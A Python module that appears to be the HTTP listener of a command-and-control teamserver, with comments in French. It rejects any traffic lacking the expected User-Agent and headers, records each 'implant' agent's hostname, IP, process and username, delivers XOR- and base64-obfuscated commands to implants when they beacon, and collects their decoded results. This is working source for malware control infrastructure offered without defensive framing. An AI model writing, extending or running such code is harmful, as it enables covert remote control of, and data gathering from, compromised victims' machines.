from flask import Flask, request, jsonify
import threading
import time
from .base_listener import BaseListener
from teamserver.encryption.xor_util import XORCipher
import logging


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


class HttpListener(BaseListener):
    def __init__(self, config, host="0.0.0.0", port=80, request_queue=None, agent_handler=None, xor_key=None):
        super().__init__(config)
        self.host = host
        self.port = port
        self.flask_app = Flask(self.config.get('name', 'http_listener'))
        self.request_queue = request_queue
        self.agent_handler = agent_handler

        # Initialisation du chiffreur XOR
        if xor_key is None:
            raise ValueError("xor_key must be provided to HttpListener")
        self.xor_cipher = XORCipher(xor_key)

        for uri in self.config.get('uri_paths', ['/']):
            self.flask_app.add_url_rule(
                uri,
                endpoint=uri,
                view_func=self.handle_request,
                methods=['GET', 'POST']
            )

        self.flask_app.add_url_rule(
            "/agent/<agent_id>/push_result",
            endpoint="push_result",
            view_func=self.push_result,
            methods=["POST"]
        )

        self.flask_app.add_url_rule(
            "/agent/<agent_id>/results",
            endpoint="get_results",
            view_func=self.get_results,
            methods=["GET"]
        )

        self.thread = threading.Thread(target=self._run, daemon=True)
        self._running = threading.Event()

    def handle_request(self):
        headers = dict(request.headers)
        expected_agent = self.config.get('user_agent')
        if expected_agent and request.headers.get("User-Agent") != expected_agent:
            return "Invalid User-Agent", 403

        expected_headers = self.config.get('http_headers', {})
        for header, value in expected_headers.items():
            if request.headers.get(header) != value:
                return f"Invalid header {header}", 403

        agent_id = None
        if self.agent_handler is not None:
            agent_id = (
                request.json.get('agent_id')
                if request.is_json and request.json and 'agent_id' in request.json
                else headers.get('X-Agent-Id')
                or (request.remote_addr + "_" + headers.get("User-Agent", ""))
            )

            now = time.time()
            if request.is_json and request.json:

                print(request.json)
                agent_fields = {
                    "last_seen": now,
                    "hostname": request.json.get("hostname"),
                    "ip": request.remote_addr,
                    "process_name": request.json.get("process_name"),
                    "username": request.json.get("username")
                }
            else:
                agent_fields = {
                    "last_seen": now,
                }
            if agent_id:
                if not self.agent_handler.get_agent(agent_id):
                    agent_fields = {
                        "last_seen": now,
                        "hostname": request.json.get("hostname"),
                        "ip": request.remote_addr,
                        "process_name": request.json.get("process_name"),
                        "username": request.json.get("username")
                    }
                    self.agent_handler.register_agent(agent_id, agent_fields)
                else:
                    self.agent_handler.update_agent(agent_id, agent_fields)

        if self.request_queue is not None:
            entry = {
                "uri": request.path,
                "headers": headers,
                "method": request.method,
                "time": time.time(),
                "remote_addr": request.remote_addr,
                "data": request.get_json(silent=True) if request.is_json else request.data.decode(errors='ignore')
            }
            self.request_queue.put(entry)

        # Livraison et SUPPRESSION immédiate des commandes à l'implant lors du beacon
        if agent_id:
            cmds = self.agent_handler.pop_commands(agent_id)
            # XOR et base64 pour chaque commande envoyée
            cmds_xor = [self.xor_cipher.encrypt_b64(cmd) for cmd in cmds]
            return jsonify({"status": "OK", "tasks": cmds_xor})
        return jsonify({"status": "OK"})

    def push_result(self, agent_id):
        if not request.is_json or "result" not in request.json:
            return jsonify({"error": "Missing 'result' key"}), 400
        xor_result = request.json["result"]
        # DéXOR le résultat en clair avant de le stocker côté handler
        try:
            decoded_result = self.xor_cipher.decrypt_b64(xor_result)
        except Exception as exc:
            return jsonify({"error": f"Failed to decode result: {exc}"}), 400
        self.agent_handler.push_agent_result(agent_id, decoded_result)
        return jsonify({"status": "result stored"})

    def get_results(self, agent_id):
        results = self.agent_handler.pop_agent_results(agent_id)
        # On chiffre les résultats avant l'envoi (dans le "sens agent")
        results_xor = [self.xor_cipher.encrypt_b64(res) for res in results]
        return jsonify({"results": results_xor})

    def start(self):
        print(f"[*] Starting HTTP listener {self.config.get('name', 'http_listener')} on {self.host}:{self.port}")
        self._running.set()
        self.thread.start()

    def _run(self):
        self.flask_app.run(host=self.host, port=self.port, debug=False, use_reloader=False)

    def stop(self):
        print(f"[*] Stopping HTTP listener {self.config.get('name', 'http_listener')}")
        self._running.clear()

    def join(self):
        while self.thread.is_alive():
            time.sleep(1)
